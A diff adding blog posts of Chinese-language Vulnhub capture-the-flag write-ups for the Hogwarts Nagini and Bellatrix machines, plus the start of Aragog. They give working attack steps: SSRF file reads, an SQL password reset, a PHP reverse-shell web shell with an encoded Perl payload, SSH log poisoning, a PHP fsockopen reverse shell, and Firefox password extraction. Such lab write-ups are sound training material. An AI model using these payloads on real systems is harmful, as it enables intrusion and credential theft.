@@ -82,6 +82,655 @@
 
     
         <h2 class="title">
+            <a href="/2022/08/08/Harrypotter-Na/">
+                Hogwarts Nagini
+            </a>
+        </h2>
+    
+    <time>
+        Aug 8, 2022
+    </time>
+    <section class="content">
+        <h1><span id="harrypotternagini">HarryPotter:Nagini</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称hogwarts-nagini">名称：Hogwarts: Nagini</span></h4><h4><span id="发布日期2021429">发布日期：2021.4.29</span></h4><h4><span id="作者mansoor-r">作者：Mansoor R</span></h4><h4><span id="系列hogwarts">系列：Hogwarts</span></h4><h4><span id="推特time4ster">推特：@time4ster</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>www-data:&#x2F;var&#x2F;www&#x2F;html&#x2F;horcrux1.txt<br>hermoine:&#x2F;root&#x2F;horcrux2.txt<br>root:&#x2F;root&#x2F;horcrux3.txt</p>
+<h4><span id="难度困难">难度：困难</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名naginiova">文件名：Nagini.ova</span></h4><h4><span id="文件大小741mb">文件大小：741MB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomharrypotternaginiova">下载地址：</span></h4><h4><span id="md5-b6c8f47bfb2421d1f12b6c1a2c095088">MD5: B6C8F47BFB2421D1F12B6C1A2C095088</span></h4><h4><span id="sha1-5cf128c51a445434e216a8c5f4087d9ecfb96739">SHA1: 5CF128C51A445434E216A8C5F4087D9ECFB96739</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机Nagini和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/08/Harrypotter-Na/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Na/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Na/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放了22和80端口，访问首页只有一张图片：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -A -p- 192.168.56.105，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Na/4.png" alt="image-"></p>
+<p><img src="/2022/08/08/Harrypotter-Na/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，发现一个note.txt，可以去看看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.105 -x html,txt,php,bak --wordlist=/usr/share/wordlists/dirb/common.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Na/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="ssrf漏洞利用">SSRF漏洞利用</span></h3><blockquote>
+<p>1.直接访问192.168.56.105&#x2F;note.txt，发现页面提示要使用http3，需要使用curl配置http3，把quic.nagini.hogwarts加入host，利用curl获取网页内容（curl配置http3见：<a target="_blank" rel="noopener" href="https://github.com/curl/curl/blob/master/docs/HTTP3.md%EF%BC%8C%E9%85%8D%E7%BD%AE%E5%A5%BD%E5%90%8E%E6%97%A0%E6%B3%95%E9%93%BE%E6%8E%A5%E5%8F%AF%E4%BB%A5%E5%B0%86kali%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E6%9A%82%E6%97%B6%E6%8D%A2%E4%B8%BANAT%EF%BC%89%EF%BC%9A">https://github.com/curl/curl/blob/master/docs/HTTP3.md，配置好后无法链接可以将kali的网络配置暂时换为NAT）：</a></p>
+<p><img src="/2022/08/08/Harrypotter-Na/7.png" alt="image-"></p>
+<p><img src="/2022/08/08/Harrypotter-Na/8.png" alt="image-"></p>
+<p><img src="/2022/08/08/Harrypotter-Na/9.png" alt="image-"></p>
+<p>2.在用http3协议访问之后，我们根据提示可以去看internalResourceFeTcher.php这个文件，发现是一个可以利用的SSRF：</p>
+<p><img src="/2022/08/08/Harrypotter-Na/10.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://quic.nagini.hogwarts/internalResourceFeTcher.php?url=file:///etc/passwd&#x27;，可以获取/etc/passwd目录下的内容</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Na/11.png" alt="image-"></p>
+</blockquote>
+<h3><span id="数据库修改登录">数据库修改登录</span></h3><blockquote>
+<p>1.我们可以利用cms的特性扫描joomla数据库所在目录，可以发现配置文件configuration.php，而这个配置文件告知了我们joomla库下一个无密码用户goblin：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://quic.nagini.hogwarts/internalResourceFeTcher.php?url=file:///var/www/html/joomla/configuration.php&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Na/12.png" alt="image-"></p>
+<p>2.接下来我们要使用Gopherus这个工具生成payload，进行sql注入类的操作，需要使用pip2：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line">python2 get-pip.py</span><br><span class="line">pip2 -V</span><br></pre></td></tr></table></figure>
+
+<p>3.将Gopherus生成的payload拼接到<a target="_blank" rel="noopener" href="http://192.168.56.105/internalResourceFeTcher.php?url=%E5%90%8E%E9%9D%A2%EF%BC%8C%E6%88%91%E4%BB%AC%E5%B7%B2%E7%BB%8F%E7%9F%A5%E9%81%93goblin%E6%98%AF%E6%97%A0%E5%AF%86%E7%A0%81%E7%94%A8%E6%88%B7%EF%BC%8C%E5%88%99%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BD%BF%E7%94%A8update%E5%91%BD%E4%BB%A4%E6%8A%8A%E6%96%B0%E5%AF%86%E7%A0%81%E5%8A%A0%E7%BB%99%E6%96%B0%E5%8A%A0%E5%85%A5%E7%9A%84%E7%94%A8%E6%88%B7%EF%BC%9A">http://192.168.56.105/internalResourceFeTcher.php?url=后面，我们已经知道goblin是无密码用户，则我们可使用update命令把新密码加给新加入的用户：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">USE joomla; </span><br><span class="line">UPDATE joomla_users SET password=‘5f4dcc3b5aa765d61d8327deb882cf99’ </span><br><span class="line">WHERE email=‘site_admin@nagini.hogwarts’;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Na/13.png" alt="image-"></p>
+<p>4.现在可以使用site_admin用户，密码password登录&#x2F;joomla&#x2F;administrator：</p>
+<p><img src="/2022/08/08/Harrypotter-Na/14.png" alt="image-"></p>
+</blockquote>
+<h3><span id="后台写入脚本getshell">后台写入脚本，getshell</span></h3><blockquote>
+<p>1.在后台Extensions栏Templates页，选择Protostar，选择newfile，创建一个php文件，php反弹代码如下：</p>
+<p><img src="/2022/08/08/Harrypotter-Na/15.png" alt="image-"></p>
+<p><img src="/2022/08/08/Harrypotter-Na/16.png" alt="image-"></p>
+<p><img src="/2022/08/08/Harrypotter-Na/17.png" alt="image-"><br>php&#96;&#96;&#96;<br><?php
+function which($pr) {
+$path = execute("which $pr");
+return ($path ? $path : $pr);
+}
+function execute($cfe) {
+$res = '';
+if ($cfe) {
+if(function_exists('exec')) {
+@exec($cfe,$res);
+$res = join("\n",$res);
+} elseif(function_exists('shell_exec')) {
+$res = @shell_exec($cfe);
+} elseif(function_exists('system')) {
+@ob_start();
+@system($cfe);
+$res = @ob_get_contents();
+@ob_end_clean();
+} elseif(function_exists('passthru')) {
+@ob_start();
+@passthru($cfe);
+$res = @ob_get_contents();
+@ob_end_clean();
+} elseif(@is_resource($f = @popen($cfe,"r"))) {
+$res = '';
+while(!@feof($f)) {
+$res .= @fread($f,1024);
+}
+@pclose($f);
+}
+}
+return $res;
+}
+function cf($fname,$text){
+if($fp=@fopen($fname,'w')) {
+@fputs($fp,@base64_decode($text));
+@fclose($fp);
+}
+}
+$yourip = "192.168.56.105 ";
+$yourport = '1234';
+$usedb = array('perl'=>'perl','c'=>'c');
+$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
+"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
+"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
+"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
+"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
+"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
+"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
+cf('/tmp/.bc',$back_connect);
+$res = execute(which('perl')." /tmp/.bc $yourip $yourport &");
+?></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;</span><br><span class="line">&gt; 2.开启kali的对应端口监听，访问http://192.168.56.105/joomla/templates/protostar/rev.php，成功getshell，再利用python简历交互式shell：</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>nc -lvnp 1234<br>python3 -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">![image-](18.png)</span><br><span class="line"></span><br><span class="line">### SSH登录，准备提权</span><br><span class="line">1.首先在/var/www/html目录下有第一个flag，即horcrux1.txt，进行base64解密：</span><br><span class="line"></span><br><span class="line">![image-](19.png)</span><br><span class="line"></span><br><span class="line">2.然后在/home/hermoine目录下有第二个flag，即horcrux2.txt，但我们没有权限查看:</span><br><span class="line"></span><br><span class="line">![image-](20.png)</span><br><span class="line"></span><br><span class="line">![image-](21.png)</span><br><span class="line"></span><br><span class="line">3.继续查看/home/snape目录，此目录下有一个.creds.txt文件，有一段base64编码，很可能就是snape用户ssh登录的密码：</span><br><span class="line"></span><br><span class="line">![image-](22.png)</span><br><span class="line"></span><br><span class="line">![image-](23.png)</span><br><span class="line"></span><br><span class="line">4.登录snape后，我们可以将我们kali的ssh-keygen复制到snape的/home/hermoine目录下，并命名为authorized_keys，赋予权限，利用本就在hermoine目录下的su_cp执行，从而在kali上可以不使用密码ssh登录hermoine：</span><br></pre></td></tr></table></figure>
+<p>find &#x2F; -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![image-](24.png)</span><br></pre></td></tr></table></figure>
+<p>Kali：<br>ssh-keygen<br>cat ~&#x2F;.ssh&#x2F;id_rsa.pub</p>
+<p>snape:<br>vim &#x2F;home&#x2F;snape&#x2F;authorized_keys<br>chmod 640 authorized_keys</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![image-](25.png)</span><br></pre></td></tr></table></figure>
+<p>cd &#x2F;home&#x2F;hermoine&#x2F;bin<br>.&#x2F;su_cp -p &#x2F;home&#x2F;snape&#x2F;authorized_keys &#x2F;home&#x2F;hermoine&#x2F;.ssh&#x2F;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![image-](26.png)</span><br></pre></td></tr></table></figure>
+<p>Kali:<br>ssh <a href="mailto:&#x68;&#101;&#114;&#109;&#x6f;&#105;&#110;&#x65;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#53;&#x36;&#46;&#x31;&#x30;&#x35;">&#x68;&#101;&#114;&#109;&#x6f;&#105;&#110;&#x65;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#53;&#x36;&#46;&#x31;&#x30;&#x35;</a> -i .ssh&#x2F;id_rsa</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">5.这个时候我们就可以去/root目录下查看horcrux2.txt这个文件，同样是用base64解密： </span><br><span class="line">![image-](27.png)</span><br><span class="line"></span><br><span class="line">### root提权</span><br><span class="line">1.我们可以在.mozilla/firefox/g2mhbq0o.default/目录下发现浏览器的登录信息，则考虑使用读取浏览器用户名和密码的工具firepwd，在hermoine开启一个http服务，传输要解密的文件给kali，可以爆出root的密码：</span><br></pre></td></tr></table></figure>
+<p>hermoine:<br>cd .mozilla&#x2F;firefox&#x2F;g2mhbq0o.default&#x2F;<br>ls -al</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![image-](28.png)</span><br></pre></td></tr></table></figure>
+<p>python3 -m http.server 9000<br>    Kali:<br>    unzip firepwd-master.zip，把firepwd下载到kali解压<br>cd firepwd-master<br>sudo pip install -r requirements.txt<br>pip3 install pycrypto<br>pip3 install pycryptodome<br>mkdir creds<br>cd creds<br>cp ~&#x2F;Desktop&#x2F;firepwd-master&#x2F;firepwd.py ~&#x2F;Desktop&#x2F;firepwd-master&#x2F;creds<br>wget <a target="_blank" rel="noopener" href="http://192.168.56.105:9000//logins.json">http://192.168.56.105:9000//logins.json</a><br>wget <a target="_blank" rel="noopener" href="http://192.168.56.105:9000//key4.db">http://192.168.56.105:9000//key4.db</a><br>python3 firepwd.py</p>
+</blockquote>
+<p>&#96;&#96;&#96;</p>
+<blockquote>
+<p><img src="/2022/08/08/Harrypotter-Na/29.png" alt="image-"></p>
+<p>2.进行root登录，在&#x2F;home目录下能找到最后一个flag，即horcrux3.txt：<br><img src="/2022/08/08/Harrypotter-Na/30.png" alt="image-"></p>
+<p><img src="/2022/08/08/Harrypotter-Na/31.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Hogwarts/" rel="tag">Hogwarts</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/08/Hogwarts-Bellatrix/">
+                Hogwarts Bellatrix
+            </a>
+        </h2>
+    
+    <time>
+        Aug 8, 2022
+    </time>
+    <section class="content">
+        <h1><span id="hogwarts-bellatrix">HOGWARTS: BELLATRIX</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称hogwarts-bellatrix">名称：Hogwarts: Bellatrix</span></h4><h4><span id="发布日期20201128">发布日期：2020.11.28</span></h4><h4><span id="作者bly">作者：BLY</span></h4><h4><span id="系列hogwarts">系列：Hogwarts</span></h4><h4><span id="推特bertrandlorent9">推特：@BertrandLorent9</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt </p>
+<h4><span id="难度简单">难度：简单</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名bellatrixova">文件名：Bellatrix.ova</span></h4><h4><span id="文件大小41gb">文件大小：4.1GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagehogwartsbellatrixova">下载地址：</span></h4><h4><span id="md5-e6d98d406cdf7641e4a966f16afaf536">MD5: E6D98D406CDF7641E4A966F16AFAF536</span></h4><h4><span id="sha1-8389861c7f2b1626190844e31a2a1a4ade385e06">SHA1: 8389861C7F2B1626190844E31A2A1A4ADE385E06</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机Bellatrix和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放了22和80端口，访问主页，发现提示存在文件包含：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.127 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/4.png" alt="image-"></p>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，没有太多值得关注的信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.127 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="文件包含漏洞利用">文件包含漏洞利用</span></h3><blockquote>
+<p>1.在主页其实是提示了有ikilledsiriusblack.php这个文件，后面跟file参数存在文件包含漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/7.png" alt="image-"></p>
+<p>2.利用文件包含漏洞，写入payload，获得shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log，可以查看SSH日志信息</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/8.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh &#x27;&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;&#x27;@192.168.56.127，稍微污染SSH日志信息</span><br><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log&amp;cmd=id，可以使用cmd命令</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/9.png" alt="image-"></p>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/10.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br><span class="line"></span><br><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log&amp;cmd=php+-r+&#x27;$sock%3dfsockopen(&quot;192.168.56.102&quot;,1234)%3bexec(&quot;/bin/sh+-i+&lt;%263+&gt;%263+2&gt;%263&quot;)%3b&#x27;，写入命令反弹shell</span><br><span class="line"></span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/11.png" alt="image-"></p>
+</blockquote>
+<h3><span id="密码爆破初步提权">密码爆破，初步提权</span></h3><blockquote>
+<p>1.我们可以在当前目录下发现一个被类似base编码了的目录，目录下有一个隐藏的字典文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br><span class="line">cd c2VjcmV0cw==</span><br><span class="line">ls -la</span><br><span class="line">cat .secret.dic</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/12.png" alt="image-"></p>
+<p>2.而Swordofgryffindor内是lestrange用户与其密码hash：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat Swordofgryffindor</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/13.png" alt="image-"></p>
+<p>3.将密码字典复制与密码hash到kali本地，利用john进行爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim dic.txt</span><br><span class="line">vim hash.txt</span><br><span class="line">john --wordlist=dic.txt hash.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/14.png" alt="image-"></p>
+<p>4.可以登录到lestrange用户：</p>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/15.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.利用sudo -l命令，查找可用文件，发现vim可以提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/16.png" alt="image-"></p>
+<p>2.直接写入，提权到root：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/vim -c &#x27;:!/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/17.png" alt="image-"></p>
+</blockquote>
+<h3><span id="flag获取">Flag获取</span></h3><blockquote>
+<p>1.现在我们在&#x2F;root目录下能够发现flag，即proof.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/18.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Hogwarts/" rel="tag">Hogwarts</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/08/Harrypotter-Ar/">
+                Harrypotter Aragog
+            </a>
+        </h2>
+    
+    <time>
+        Aug 8, 2022
+    </time>
+    <section class="content">
+        <h1><span id="harrypotteraragog">HarryPotter:Aragog</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称harrypotteraragog">名称：HarryPotter:Aragog</span></h4><h4><span id="发布日期2021510">发布日期：2021.5.10</span></h4><h4><span id="作者mansoor-r">作者：Mansoor R</span></h4><h4><span id="系列harrypotter">系列：HarryPotter</span></h4><h4><span id="推特time4ster">推特：@time4ster</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>www-data:&#x2F;home&#x2F;hagrid98&#x2F;horcrux1.txt<br>root:&#x2F;root&#x2F;horcrux2.txt</p>
+<h4><span id="难度简单">难度：简单</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名aragog-102ova">文件名：Aragog-1.0.2.ova</span></h4><h4><span id="文件大小705mb">文件大小：705MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimageharrypotteraragog-102ova">下载地址：</span></h4><h4><span id="md5-48a8bd22b27945a9a6fbcf6c57150162">MD5: 48A8BD22B27945A9A6FBCF6C57150162</span></h4><h4><span id="sha1-da8b34ead85c1f6ab66a907a6ba94f6b8284bcf7">SHA1: DA8B34EAD85C1F6AB66A907A6BA94F6B8284BCF7</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机Aragog和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/08/Harrypotter-Ar/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/2.png" alt="image-"></p>
